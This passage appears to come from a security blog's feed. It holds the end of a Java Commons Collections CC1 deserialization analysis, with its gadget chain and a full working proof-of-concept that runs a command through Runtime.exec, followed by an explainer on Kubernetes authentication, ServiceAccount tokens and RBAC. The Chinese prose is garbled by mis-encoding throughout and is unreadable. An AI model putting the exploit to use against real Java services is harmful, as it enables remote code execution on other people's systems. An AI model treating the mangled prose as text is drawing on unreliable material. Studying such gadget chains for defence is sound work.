å…¥<code>Runtime.class</code>å³å¯</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/22.png" alt="22"></p><h4 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map.Entry.setValue()</span><br><span class="line">  TransformedMap.checkSetValue()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h4 id="æœ€ç»ˆpoc"><a href="#æœ€ç»ˆpoc" class="headerlink" title="æœ€ç»ˆpoc"></a>æœ€ç»ˆpoc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">       HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">"value"</span>,<span class="string">"aaa"</span>);</span><br><span class="line">       Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">       Class c = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">       Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">       annotationInvocationhdlConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object o = annotationInvocationhdlConstructor.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line">       serialize(o);</span><br><span class="line">       unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String  Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><ul><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></li><li><a href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></li><li><a href="https://paper.seebug.org/1242/" target="_blank" rel="noopener">https://paper.seebug.org/1242/</a></li><li><a href="https://www.buaq.net/go-75937.html" target="_blank" rel="noopener">https://www.buaq.net/go-75937.html</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&amp;mid=2247483715&amp;idx=1&amp;sn=bda48a95891b8a4533fbe1535d1ac75b&amp;chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&amp;token=1359929470&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&amp;mid=2247483715&amp;idx=1&amp;sn=bda48a95891b8a4533fbe1535d1ac75b&amp;chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&amp;token=1359929470&amp;lang=zh_CN#rd</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Apache-Commons-Collections&quot;&gt;&lt;a href=&quot;#Apache-Commons-Collections&quot; class=&quot;headerlink&quot; title=&quot;Apache Commons Collections&quot;&gt;&lt;/a&gt;Apache C
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Kuberneteså®‰å…¨</title>
    <link href="elssm.github.io/2021/10/25/Kubernetes%E5%AE%89%E5%85%A8/"/>
    <id>elssm.github.io/2021/10/25/Kuberneteså®‰å…¨/</id>
    <published>2021-10-25T07:17:36.000Z</published>
    <updated>2021-12-13T09:47:48.910Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æœºåˆ¶è¯´æ˜"><a href="#æœºåˆ¶è¯´æ˜" class="headerlink" title="æœºåˆ¶è¯´æ˜"></a>æœºåˆ¶è¯´æ˜</h4><p>Kubernetesä½œä¸ºä¸€ä¸ªåˆ†å¸ƒå¼é›†ç¾¤çš„ç®¡ç†å·¥å…·ï¼Œä¿è¯é›†ç¾¤çš„å®‰å…¨æ€§æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ä»»åŠ¡ï¼Œ<code>API Server</code>æ˜¯é›†ç¾¤å†…éƒ¨å„ä¸ªç»„ä»¶é€šä¿¡çš„ä¸­ä»‹ï¼Œä¹Ÿæ˜¯å¤–éƒ¨æ§åˆ¶çš„å…¥å£ï¼Œå› æ­¤Kubernetesçš„å®‰å…¨æœºåˆ¶åŸºæœ¬å°±æ˜¯å›´ç»•ä¿æŠ¤<code>API Server</code>æ¥è®¾è®¡çš„ï¼Œåœ¨Kubernetesä¸­ï¼Œé‡‡ç”¨äº†è®¤è¯(Authentication)ã€é‰´æƒ(Authorization)ã€å‡†å…¥æ§åˆ¶(Admission Controll)ä¸‰æ­¥æ¥ä¿è¯<code>API Server</code>çš„å®‰å…¨ã€‚</p><h4 id="Kubernetes-APIè®¿é—®æ§åˆ¶"><a href="#Kubernetes-APIè®¿é—®æ§åˆ¶" class="headerlink" title="Kubernetes APIè®¿é—®æ§åˆ¶"></a>Kubernetes APIè®¿é—®æ§åˆ¶</h4><p>ç”¨æˆ·ä½¿ç”¨<code>kubectl</code>ã€å®¢æˆ·ç«¯åº“æˆ–æ„é€ RESTè¯·æ±‚æ¥è®¿é—®<code>Kubernetes API</code>ã€‚ç”¨æˆ·å’Œ<code>Kubernetes</code>æœåŠ¡è´¦æˆ·éƒ½å¯ä»¥è¢«é‰´æƒè®¿é—®APIã€‚å½“è¯·æ±‚åˆ°è¾¾APIæ—¶ï¼Œä¼šç»å†å¤šä¸ªé˜¶æ®µï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/25/Kuberneteså®‰å…¨/4.png" alt="4"></p><p>åœ¨å…¸å‹çš„Kubernetesé›†ç¾¤ä¸­ï¼ŒAPIæœåŠ¡å™¨åœ¨442ç«¯å£ä¸Šæä¾›æœåŠ¡ï¼Œå—TLSä¿æŠ¤ï¼ŒAPIæœåŠ¡å™¨å‡ºå‡ºç¤ºè¯ä¹¦ã€‚è¯¥è¯ä¹¦å¯ä»¥ä½¿ç”¨ç§æœ‰è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰ç­¾åï¼Œä¹Ÿå¯ä»¥åŸºäºé“¾æ¥åˆ°å…¬è®¤çš„CAçš„å…¬é’¥åŸºç¡€æ¶æ„ç­¾åã€‚å¦‚æœä½ çš„é›†ç¾¤ä½¿ç”¨ç§æœ‰è¯ä¹¦é¢å‘æœºæ„ï¼Œä½ éœ€è¦åœ¨å®¢æˆ·ç«¯çš„<code>~/.kube/config</code>æ–‡ä»¶ä¸­æä¾›è¯¥è¯ä¹¦çš„å‰¯æœ¬ï¼Œä»¥ä¾¿ä½ å¯ä»¥ä¿¡ä»»è¯¥é“¾æ¥å¹¶ç¡®è®¤è¿æ¥æ²¡æœ‰è¢«æ‹¦æˆªã€‚</p><h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><p>åœ¨Kubernetesä¸­ï¼Œè®¤è¯åˆ†ä¸ºä¸‹é¢ä¸‰ç§</p><ul><li>HTTP Tokenè®¤è¯ï¼šé€šè¿‡ä¸€ä¸ªTokenæ¥è¯†åˆ«åˆæ³•ç”¨æˆ·<ul><li>HTTP Tokençš„è®¤è¯æ˜¯ç”¨ä¸€ä¸ªå¾ˆé•¿çš„ç‰¹æ®Šç¼–ç æ–¹å¼çš„å¹¶ä¸”éš¾ä»¥è¢«æ¨¡ä»¿çš„å­—ç¬¦ä¸²ï¼Œå³Tokenæ¥è¡¨è¾¾å®¢æˆ·çš„ä¸€ç§æ–¹å¼ï¼ŒTokenæ˜¯ä¸€ä¸ªå¾ˆé•¿çš„å¾ˆå¤æ‚çš„å­—ç¬¦ä¸²ï¼Œæ¯ä¸€ä¸ªTokenå¯¹ä¸€ä¸ªä¸€ä¸ªç”¨æˆ·åå­˜æ”¾åœ¨<code>API Server</code>èƒ½è®¿é—®çš„æ–‡ä»¶ä¸­ï¼Œå½“å®¢æˆ·ç«¯å‘èµ·APIè°ƒç”¨è¯·æ±‚æ—¶ï¼Œéœ€è¦åœ¨<code>HTTP Header</code>é‡Œæ”¾å…¥Token</li></ul></li><li>HTTP Baseè®¤è¯ï¼šé€šè¿‡ç”¨æˆ·å+å¯†ç çš„æ–¹å¼è®¤è¯<ul><li>ç”¨æˆ·å+å¯†ç é‡‡ç”¨<code>Base64</code>ç®—æ³•è¿›è¡Œç¼–ç åçš„å­—ç¬¦ä¸²æ”¾åœ¨<code>HTTP Request</code>ä¸­çš„<code>Heather Authorization</code>åŸŸé‡Œå‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°åè¿›è¡Œç¼–ç ï¼Œè·å–ç”¨æˆ·ååŠå¯†ç ã€‚</li></ul></li><li>HTTPSè¯ä¹¦è®¤è¯ï¼šåŸºäºCAæ ¹è¯ä¹¦ç­¾åçš„å®¢æˆ·ç«¯èº«ä»½è®¤è¯æ–¹å¼ã€‚è¿™ç§æ–¹å¼æœ€ä¸ºä¸¥æ ¼ï¼Œå¯¹äºä¸Šé¢çš„ä¸¤ç§æ–¹å¼ï¼Œç›¸å½“äºåªåšäº†æœåŠ¡ç«¯è®¤è¯å®¢æˆ·ç«¯ï¼Œå¹¶æ²¡æœ‰åšå®¢æˆ·ç«¯å¯¹æœåŠ¡ç«¯çš„è®¤è¯ã€‚</li></ul><h5 id="éœ€è¦è®¤è¯çš„èŠ‚ç‚¹"><a href="#éœ€è¦è®¤è¯çš„èŠ‚ç‚¹" class="headerlink" title="éœ€è¦è®¤è¯çš„èŠ‚ç‚¹"></a>éœ€è¦è®¤è¯çš„èŠ‚ç‚¹</h5><ul><li>Kubernetesç»„ä»¶å¯¹<code>API Server</code>çš„è®¿é—®ï¼š<code>kubectl</code>ã€<code>Controller Manager</code>ã€<code>Scheduler</code>ã€<code>kubelet</code>ã€<code>kube-proxy</code></li><li>Kubernetesç®¡ç†çš„Podå¯¹å®¹å™¨çš„è®¿é—®ï¼šPodï¼ˆdashboardä¹Ÿæ˜¯ä»¥Podå½¢å¼è¿è¡Œï¼‰</li></ul><h5 id="å®‰å…¨æ€§è¯´æ˜"><a href="#å®‰å…¨æ€§è¯´æ˜" class="headerlink" title="å®‰å…¨æ€§è¯´æ˜"></a>å®‰å…¨æ€§è¯´æ˜</h5><ul><li><code>Controller Manager</code>ã€<code>Scheduler</code>ä¸<code>API Server</code>åœ¨åŒä¸€å°æœºå™¨ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨<code>API Server</code>çš„éå®‰å…¨ç«¯å£è®¿é—®,<code>--insecure-bind-address=127.0.0.1</code></li><li><code>kubectl</code>ã€<code>kubelet</code>ã€<code>kube-proxy</code>è®¿é—®<code>API Server</code>éƒ½éœ€è¦è¯ä¹¦è¿›è¡ŒHTTPSåŒå‘è®¤è¯</li></ul><h5 id="è¯ä¹¦é¢å‘"><a href="#è¯ä¹¦é¢å‘" class="headerlink" title="è¯ä¹¦é¢å‘"></a>è¯ä¹¦é¢å‘</h5><ul><li>æ‰‹åŠ¨ç­¾å‘ï¼šé€šè¿‡Kubernetesé›†ç¾¤æ ¹CAè¿›è¡Œç­¾å‘HTTPSè¯ä¹¦</li><li>è‡ªåŠ¨ç­¾å‘ï¼š<code>kubelet</code>é¦–æ¬¡è®¿é—®<code>API Server</code>æ—¶ï¼Œä½¿ç”¨Tokenåšè®¤è¯ï¼Œé€šè¿‡åï¼Œ<code>Controller Manager</code>ä¼šä¸º<code>kubelet</code>ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ï¼Œä»¥åçš„è®¿é—®éƒ½æ˜¯ç”¨è¯ä¹¦åšè®¤è¯ã€‚</li></ul><h5 id="kubeconfig"><a href="#kubeconfig" class="headerlink" title="kubeconfig"></a>kubeconfig</h5><p>kubeconfigæ–‡ä»¶åŒ…å«é›†ç¾¤å‚æ•°(CAè¯ä¹¦ï¼Œ<code>API Server</code>åœ°å€)ï¼Œå®¢æˆ·ç«¯å‚æ•°(ç”Ÿæˆçš„è¯ä¹¦å’Œç§é’¥)ï¼Œé›†ç¾¤çš„contextä¿¡æ¯(é›†ç¾¤åç§°ã€ç”¨æˆ·å)ã€‚Kubernetesç»„ä»¶é€šè¿‡å¯åŠ¨æ—¶æŒ‡å®šä¸åŒçš„kubeconfigæ–‡ä»¶å¯ä»¥åˆ‡æ¢åˆ°ä¸åŒçš„é›†ç¾¤ã€‚</p><p>æŸ¥çœ‹kubeconfigæ–‡ä»¶</p><p><img src="/2021/10/25/Kuberneteså®‰å…¨/1.png" alt="1"></p><h5 id="ServiceAccount"><a href="#ServiceAccount" class="headerlink" title="ServiceAccount"></a>ServiceAccount</h5><p>Podä¸­çš„å®¹å™¨è®¿é—®<code>API Server</code>ï¼Œå› ä¸ºPodçš„åˆ›å»ºã€é”€æ¯æ˜¯åŠ¨æ€çš„ï¼Œå› æ­¤è¦ä¸ºå®ƒæ‰‹åŠ¨ç”Ÿæˆè¯ä¹¦å°±æ¯”è¾ƒéº»çƒ¦ï¼ŒKubernetesä½¿ç”¨äº†SAè§£å†³Podè®¿é—®<code>API Server</code>çš„è®¤è¯é—®é¢˜ã€‚</p><h5 id="Secretä¸SAçš„å…³ç³»"><a href="#Secretä¸SAçš„å…³ç³»" class="headerlink" title="Secretä¸SAçš„å…³ç³»"></a>Secretä¸SAçš„å…³ç³»</h5><p>Kubernetesè®¾è®¡äº†ä¸€ç§èµ„æºå¯¹è±¡å«åšSecretï¼Œåˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç§æ˜¯ç”¨äº<code>ServiceAccount</code>çš„<code>server-account-token</code>ï¼Œå¦ä¸€ç§æ˜¯ç”¨äºä¿å­˜ç”¨æˆ·è‡ªå®šä¹‰ä¿å¯†ä¿¡æ¯çš„<code>Opaque</code>ã€‚<code>ServiceAccount</code>ä¸­åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ã€‚Tokenã€ca.crtã€namespace</p><ul><li>Tokenæ˜¯ä½¿ç”¨<code>API Server</code>ç§é’¥ç­¾åçš„JWTï¼Œç”¨äºè®¿é—®<code>API Server</code>æ—¶ï¼ŒServerç«¯è®¤è¯</li><li>ca.crtæ ¹è¯ä¹¦ï¼Œç”¨äºClientç«¯éªŒè¯<code>API Server</code>å‘é€çš„è¯ä¹¦</li><li>namespaceæ ‡è¯†è¿™ä¸ª<code>service-account-token</code>çš„ä½œç”¨åŸŸåç©ºé—´</li></ul><p>æŸ¥çœ‹<code>ServiceAccount</code></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªnamespaceéƒ½ä¼šæœ‰ä¸€ä¸ª<code>ServiceAccount</code>ï¼Œå¦‚æœPodåœ¨åˆ›å»ºæ—¶æ²¡æœ‰æŒ‡å®š<code>ServiceAccount</code>ï¼Œå°±ä¼šä½¿ç”¨Podæ‰€å±çš„namespaceçš„<code>ServiceAccount</code>ã€‚é»˜è®¤çš„æŒ‚è½½ç›®å½•æ˜¯<code>/run/secrets/kubernetes.io/serviceaccount/</code></p><p>é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å½“å‰å­˜åœ¨çš„å‘½åç©ºé—´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro .kube % kubectl get ns</span><br><span class="line">NAME              STATUS   AGE</span><br><span class="line">default           Active   18d</span><br><span class="line">kube-node-lease   Active   18d</span><br><span class="line">kube-public       Active   18d</span><br><span class="line">kube-system       Active   18d</span><br></pre></td></tr></table></figure><p>æ¥ç€æŸ¥çœ‹å‘½åç©ºé—´ä¸º<code>kube-system</code>ä¸‹çš„pod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl get pod -n kube-system</span><br><span class="line">NAME                                     READY   STATUS    RESTARTS   AGE</span><br><span class="line">coredns-558bd4d5db-fpmvp                 1/1     Running   6          18d</span><br><span class="line">coredns-558bd4d5db-m8zcd                 1/1     Running   6          18d</span><br><span class="line">etcd-docker-desktop                      1/1     Running   6          18d</span><br><span class="line">kube-apiserver-docker-desktop            1/1     Running   7          18d</span><br><span class="line">kube-controller-manager-docker-desktop   1/1     Running   6          18d</span><br><span class="line">kube-proxy-zw8fj                         1/1     Running   6          18d</span><br><span class="line">kube-scheduler-docker-desktop            1/1     Running   52         18d</span><br><span class="line">storage-provisioner                      1/1     Running   56         18d</span><br><span class="line">vpnkit-controller                        1/1     Running   1034       18d</span><br></pre></td></tr></table></figure><p>ä¹‹åè¿›å…¥åä¸º<code>kube-proxy-zw8fj</code>çš„podä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it kube-proxy-zw8fj -n kube-system -- /bin/sh</span><br></pre></td></tr></table></figure><p>è¿›å…¥åˆ°æŒ‚è½½ç›®å½•å¹¶æŸ¥çœ‹tokençš„è¯¦ç»†ä¿¡æ¯</p><p><img src="/2021/10/25/Kuberneteså®‰å…¨/2.png" alt="2"></p><h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p>åœ¨è®¤è¯è¿‡ç¨‹ä¸­ï¼Œåªæ˜¯é€šä¿¡åŒæ–¹ç¡®è®¤äº†å¯¹æ–¹æ˜¯å¯ä¿¡çš„ï¼Œå¹¶ä¸”å¯ä»¥ç›¸äº’é€šä¿¡ï¼Œè€Œé‰´æƒæ˜¯ç¡®å®šè¯·æ±‚æ–¹æœ‰å“ªäº›èµ„æºçš„æƒé™ï¼Œ<code>API Server</code>ç›®å‰æ”¯æŒä»¥ä¸‹å‡ ç§æˆæƒç­–ç•¥ï¼ˆé€šè¿‡<code>API Server</code>çš„å¯åŠ¨å‚æ•°<code>--authorization-mode</code>è®¾ç½®ï¼‰</p><ul><li>AlwaysDenyï¼šè¡¨ç¤ºæ‹’ç»æ‰€æœ‰çš„è¯·æ±‚ï¼Œä¸€èˆ¬ç”¨äºæµ‹è¯•</li><li>AlwaysAllowï¼šå…è®¸æ¥æ”¶æ‰€æœ‰è¯·æ±‚ï¼Œå¦‚æœé›†ç¾¤ä¸éœ€è¦æˆæƒæµç¨‹ï¼Œåˆ™å¯ä»¥é‡‡ç”¨è¯¥ç­–ç•¥</li><li>ABAC(Attribute-Based Access Control)ï¼šåŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ï¼Œè¡¨ç¤ºä½¿ç”¨ç”¨æˆ·é…ç½®çš„æˆæƒè§„åˆ™å¯¹ç”¨æˆ·è¯·æ±‚è¿›è¡ŒåŒ¹é…å’Œæ§åˆ¶</li><li>Webhookï¼šé€šè¿‡è°ƒç”¨å¤–éƒ¨RESTæœåŠ¡å¯¹ç”¨æˆ·è¿›è¡Œæˆæƒ</li><li>RBAC(ROle-Based Access Control)ï¼šåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼Œç°è¡Œé»˜è®¤è§„åˆ™</li></ul><h5 id="RBACæˆæƒæ¨¡å¼"><a href="#RBACæˆæƒæ¨¡å¼" class="headerlink" title="RBACæˆæƒæ¨¡å¼"></a>RBACæˆæƒæ¨¡å¼</h5><p>RBACåœ¨Kubernetes1.5ä¸­å¼•å…¥ï¼Œç°è¡Œç‰ˆæœ¬æˆä¸ºé»˜è®¤æ ‡å‡†ï¼Œç›¸å¯¹å…¶ä»–è®¿é—®æ§åˆ¶æ–¹å¼ï¼Œæ‹¥æœ‰ä»¥ä¸‹ä¼˜åŠ¿</p><ul><li>å¯¹é›†ç¾¤ä¸­çš„èµ„æºå’Œéèµ„æºå‡æ‹¥æœ‰å®Œæ•´çš„è¦†ç›–</li><li>æ•´ä¸ªRBACå®Œå…¨ç”±å‡ ä¸ªAPIå¯¹è±¡å®Œæˆï¼ŒåŒå…¶ä»–APIå¯¹è±¡ä¸€æ ·ï¼Œå¯ä»¥ç”¨<code>kubectl</code>æˆ–APIè¿›è¡Œæ“ä½œ</li><li>å¯ä»¥åœ¨è¿è¡Œæ—¶è¿›è¡Œè°ƒæ•´ï¼Œæ— éœ€é‡å¯<code>API Server</code></li></ul><p>RBACçš„APIèµ„æºå¯¹è±¡è¯´æ˜</p><p>RBACå¼•å…¥äº†4ä¸ªæ–°çš„é¡¶çº§èµ„æºå¯¹è±¡ï¼š<code>Role</code>ã€<code>ClusterRole</code>ã€<code>RoleBinding</code>ã€<code>ClusterRoleBinding</code>ã€‚å››ç§å¯¹è±¡ç±»å‹å‡å¯ä»¥é€šè¿‡<code>kubectl</code>ä¸APIæ“ä½œã€‚éƒ¨åˆ†å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/25/Kuberneteså®‰å…¨/3.png" alt="3"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯Kuberneteså¹¶ä¸ä¼šæä¾›ç”¨æˆ·ç®¡ç†ï¼Œå¯¹äºUserã€Groupã€ServiceAccountæŒ‡å®šçš„ç”¨æˆ·ï¼ŒKubernetesç»„ä»¶(kubectlã€kube-proxy)æˆ–æ˜¯å…¶ä»–è‡ªå®šä¹‰çš„ç”¨æˆ·åœ¨å‘CAç”³è¯·è¯ä¹¦æ—¶ï¼Œéœ€è¦æä¾›ä¸€ä¸ªè¯ä¹¦è¯·æ±‚æ–‡ä»¶ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"CN"</span>:<span class="string">"admin"</span>,</span><br><span class="line">  <span class="attr">"hosts"</span>:[],</span><br><span class="line">  <span class="attr">"key"</span>:&#123;</span><br><span class="line">    <span class="attr">"algo"</span>:<span class="string">"rsa"</span>,</span><br><span class="line">    <span class="attr">"size"</span>:<span class="number">2048</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"names"</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"C"</span>:<span class="string">"CN"</span>,</span><br><span class="line">      <span class="attr">"ST"</span>:<span class="string">"Hangzhou"</span>,</span><br><span class="line">      <span class="attr">"L"</span>:<span class="string">"XS"</span>,</span><br><span class="line">      <span class="attr">"O"</span>:<span class="string">"system:masters"</span>,</span><br><span class="line">      <span class="attr">"OU"</span>:<span class="string">"System"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>API Server</code>ä¼šæŠŠå®¢æˆ·ç«¯è¯ä¹¦çš„<code>CN</code>å­—æ®µä½œä¸ºUserï¼ŒæŠŠ<code>names.O</code>å­—æ®µä½œä¸ºGroup</p><p><code>kubelet</code>ä½¿ç”¨<code>TLS Bootstrapping</code>è®¤è¯æ—¶ï¼Œ<code>API Server</code>å¯ä»¥ä½¿ç”¨<code>Bootstrap Tokens</code>æˆ–è€…<code>Token authentication file</code>éªŒè¯tokenï¼Œæ— 